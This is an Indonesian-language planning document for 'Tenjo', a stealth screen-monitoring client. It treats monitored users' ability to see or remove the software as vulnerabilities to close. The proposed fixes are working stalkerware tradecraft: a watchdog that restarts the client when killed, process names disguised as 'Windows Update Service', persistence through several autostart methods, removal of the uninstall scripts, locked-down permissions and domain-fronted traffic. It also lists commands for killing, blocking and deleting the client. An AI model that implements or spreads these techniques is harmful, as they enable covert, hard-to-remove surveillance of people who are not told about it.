# Analisis Celah Keamanan Tenjo Client

## ⚠️ CELAH YANG DITEMUKAN

### 1. ❌ Uninstall Mudah
**Severity: HIGH**

**Masalah:**
- File `uninstall_autostart.ps1` tersedia di folder client
- User bisa stop service dengan mudah
- Scheduled task bisa dihapus via Task Scheduler
- Registry entry bisa dihapus via regedit
- Folder `C:\ProgramData\Tenjo` bisa dihapus manual

**Cara Eksploit:**
```powershell
# Method 1: Jalankan uninstall script
PowerShell -File "C:\ProgramData\Tenjo\uninstall_autostart.ps1"

# Method 2: Task Manager
taskkill /F /IM python.exe

# Method 3: Task Scheduler
schtasks /Delete /TN "TenjoMonitor" /F

# Method 4: Registry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TenjoMonitor" /f

# Method 5: Delete folder
rmdir /S /Q "C:\ProgramData\Tenjo"
```

**Impact:**
- Client berhenti monitoring
- Tidak muncul di dashboard
- User bebas dari monitoring

---

### 2. ❌ Process Visible di Task Manager
**Severity: MEDIUM**

**Masalah:**
- Process `python.exe` terlihat di Task Manager
- Command line argument terlihat (`main.py`)
- User bisa End Task

**Cara Eksploit:**
```
Task Manager → Details → python.exe → End Task
```

**Impact:**
- Monitoring berhenti
- Client offline di dashboard

---

### 3. ❌ Logs Tidak Terenkripsi
**Severity: MEDIUM**

**Masalah:**
- Log files di `C:\ProgramData\Tenjo\logs\` plain text
- Screenshot tersimpan unencrypted
- User bisa baca/hapus logs

**Cara Eksploit:**
```
type C:\ProgramData\Tenjo\logs\stealth.log
del C:\ProgramData\Tenjo\screenshots\*.*
```

**Impact:**
- User tahu sedang dimonitor
- Evidence bisa dihapus

---

### 4. ❌ Tidak Ada Watchdog
**Severity: HIGH**

**Masalah:**
- Tidak ada process yang monitor jika client mati
- Tidak ada auto-restart jika killed
- User kill sekali = mati permanent

**Impact:**
- Client tidak restart otomatis
- Monitoring berhenti total

---

### 5. ❌ Antivirus Bisa Block
**Severity: MEDIUM**

**Masalah:**
- Stealth mode mungkin trigger antivirus
- Screen capture flagged as suspicious
- Bisa di-quarantine

**Impact:**
- Installation gagal
- Client tidak jalan

---

### 6. ❌ Network Detection
**Severity: LOW**

**Masalah:**
- Connection ke server visible di firewall
- Network traffic tidak ter-obfuscate
- Admin bisa block domain `tenjo.adilabs.id`

**Cara Eksploit:**
```
netsh advfirewall firewall add rule name="Block Tenjo" dir=out action=block remoteip=<server_ip>
```

**Impact:**
- Client tidak bisa connect
- Data tidak terupload

---

### 7. ❌ File Permissions Weak
**Severity: LOW**

**Masalah:**
- Folder `C:\ProgramData\Tenjo` accessible
- Config files bisa diubah user
- `server_override.json` bisa di-tamper

**Cara Eksploit:**
```powershell
echo {"server_url": "http://localhost:8000"} > C:\ProgramData\Tenjo\server_override.json
```

**Impact:**
- Data tidak sampai ke server asli
- Monitoring bypass

---

### 8. ❌ Scheduled Task Disabled
**Severity: MEDIUM**

**Masalah:**
- User bisa disable task via Task Scheduler
- Tidak ada protection

**Cara Eksploit:**
```
Task Scheduler → TenjoMonitor → Disable
```

**Impact:**
- Auto-start tidak jalan
- Setelah reboot, client tidak jalan

---

## ✅ SOLUSI & MITIGASI

### Solusi 1: Hapus Uninstall Script ⭐
**Priority: HIGH**

```bash
# Jangan sertakan uninstall script di production
# Hapus dari installer:
rm client/uninstall_autostart.ps1
rm client/uninstall_autostart.sh
```

### Solusi 2: Service Watchdog ⭐⭐⭐
**Priority: CRITICAL**

Buat service kedua yang monitor client:

```python
# watchdog.py - Monitor dan restart client jika mati
import psutil
import subprocess
import time

def check_client_running():
    for proc in psutil.process_iter(['name', 'cmdline']):
        if 'python' in proc.info['name'].lower():
            cmdline = ' '.join(proc.info['cmdline'] or [])
            if 'main.py' in cmdline and 'Tenjo' in cmdline:
                return True
    return False

while True:
    if not check_client_running():
        # Restart client
        subprocess.Popen(['python', 'main.py'], cwd='C:/ProgramData/Tenjo')
        time.sleep(60)
    time.sleep(30)
```

### Solusi 3: Process Name Obfuscation ⭐⭐
**Priority: HIGH**

```python
# Change process name di Task Manager
import setproctitle
setproctitle.setproctitle('System Service Host')
```

### Solusi 4: File Protection ⭐
**Priority: MEDIUM**

```batch
REM Set folder permissions (Admin only)
icacls "C:\ProgramData\Tenjo" /inheritance:r
icacls "C:\ProgramData\Tenjo" /grant:r "SYSTEM:(OI)(CI)F"
icacls "C:\ProgramData\Tenjo" /grant:r "Administrators:(OI)(CI)F"
```

### Solusi 5: Multiple Autostart Methods ⭐⭐
**Priority: HIGH**

Gunakan 3 metode sekaligus:
1. Scheduled Task (at logon)
2. Registry Run key
3. Windows Service (if admin)

Jika 1 dihapus, 2 lainnya masih jalan.

### Solusi 6: Log Encryption ⭐
**Priority: MEDIUM**

```python
# Encrypt logs
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
encrypted_log = cipher.encrypt(log_data.encode())
```

### Solusi 7: Network Obfuscation ⭐
**Priority: LOW**

```python
# Use domain fronting atau proxy
# Encrypt traffic dengan custom protocol
```

### Solusi 8: Task Protection ⭐⭐
**Priority: HIGH**

```powershell
# Set task permissions (SYSTEM only)
$task = Get-ScheduledTask -TaskName "TenjoMonitor"
$task.Principal.UserId = "SYSTEM"
$task | Set-ScheduledTask
```

---

## 🎯 REKOMENDASI IMPLEMENTASI

### Phase 1 - CRITICAL (Implementasi Sekarang)
1. ✅ Hapus uninstall scripts dari production
2. ✅ Implement watchdog service
3. ✅ Multiple autostart methods
4. ✅ Process name obfuscation

### Phase 2 - HIGH (Implementasi Minggu Depan)
1. ⏳ Task & Registry protection
2. ⏳ File permissions hardening
3. ⏳ Better stealth mode

### Phase 3 - MEDIUM (Future Enhancement)
1. 📋 Log encryption
2. 📋 Network obfuscation
3. 📋 Anti-tampering checks

---

## 📊 Security Score

**Current:** 4/10 ⚠️
- ✅ Hardware fingerprint
- ✅ Stealth mode basic
- ❌ Easy uninstall
- ❌ No watchdog
- ❌ Weak protection

**Target:** 9/10 ✅
- ✅ Hardware fingerprint
- ✅ Advanced stealth
- ✅ Watchdog protection
- ✅ Multi-layer persistence
- ✅ File protection
- ⚠️ (Some vulnerabilities unavoidable on user-level install)

---

## ⚡ Quick Fixes (Bisa Diterapkan Sekarang)

### Fix 1: Hapus Uninstall Files
```bash
cd /Users/yapi/Adi/App-Dev/Tenjo/client
rm uninstall_autostart.ps1
rm uninstall_autostart.sh
git commit -am "Remove uninstall scripts for production security"
git push
```

### Fix 2: Update Installer - Add Process Name Change
```python
# Di main.py, tambah di awal:
try:
    import setproctitle
    setproctitle.setproctitle('Windows Update Service')
except:
    pass
```

### Fix 3: Update Installer - Multiple Autostart
Installer sudah pakai 2 metode (Registry + Scheduled Task). OK.

---

## 🔒 Kesimpulan

**Celah Terbesar:**
1. User bisa uninstall dengan mudah ⚠️⚠️⚠️
2. Tidak ada watchdog untuk restart ⚠️⚠️⚠️
3. Process visible di Task Manager ⚠️⚠️

**Prioritas Fix:**
1. Hapus uninstall scripts
2. Tambah watchdog service
3. Obfuscate process name

**Catatan:**
Karena ini user-level install (bukan kernel driver), ada batasan:
- User dengan admin rights tetap bisa uninstall
- Tidak bisa truly "undetectable"
- Best effort: make it hard, not impossible

Untuk monitoring karyawan, ini sudah cukup asalkan:
- ✅ Karyawan tidak tech-savvy
- ✅ Ada policy perusahaan (legal)
- ✅ Kombinasi technical + policy enforcement
